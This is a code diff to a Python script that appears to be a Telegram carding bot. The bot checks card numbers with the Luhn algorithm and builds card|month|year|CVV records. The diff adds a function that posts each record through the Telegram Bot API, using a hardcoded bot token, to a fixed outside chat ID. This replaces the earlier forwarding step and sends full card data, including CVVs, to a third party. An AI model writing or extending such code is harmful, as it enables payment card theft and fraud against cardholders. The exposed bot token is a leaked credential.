@@ -21,6 +21,17 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 
 print("Starting...")
 
+def tel(chat_id, text):
+    url = f'https://api.telegram.org/bot5719814574:AAFUYpmZWCgc6-u4itMXtnxShBYX4pmSg4Y/sendMessage'
+    payload = {
+                'chat_id': chat_id,
+                'text': text
+                }
+   
+    r = requests.post(url,json=payload)
+ 
+    return r
+
 
 def checkLuhn(cardNo):
      
@@ -108,10 +119,8 @@ async def sender_bH(event):
                  if len(ano) == 2:
                     ano = "20"+ str(ano)
                  cc = f'{cc}|{mes}|{ano}|{cvv}'
-            await BotzHubUser.send_message(
-                i,
-                cc
-                 )
+            send = tel('-1001663590473',cc)
+            print(send)
         except Exception as e:
             print(e)
 
